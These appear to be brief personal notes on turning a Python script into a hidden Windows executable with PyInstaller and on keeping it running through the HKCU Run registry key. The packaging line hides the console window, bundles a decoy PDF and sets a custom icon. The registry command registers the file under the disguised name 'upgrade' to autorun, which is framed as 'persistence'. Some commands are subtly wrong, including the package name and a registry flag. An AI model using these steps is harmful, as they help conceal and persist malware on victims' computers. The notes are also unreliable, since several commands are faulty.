To convert .py to .exe:
# pip install pyinstall
# /path/to/package/pyinstaller.exe filename.py --onefile --add-data "C://path/to/some/document.pdf;." --noconsole --icon C://path/to/icon.ico
# creates 4 folders 
# dest folder contains the filename.exe of filename.py file

To maintain presistance:
# regedit - register editor
#  - HKEY_CURRENT_USER
#  - Software
#  - Microsoft
#  - Windows
#  - CurrentVersion
#  - Run

//---contain the software that autorun on startup

# Command to do the same through cmd 
# reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v upgrade /s REG_SZ /d C://Users/IEuser/Appdata.exe
# will add to autorun in the register editor
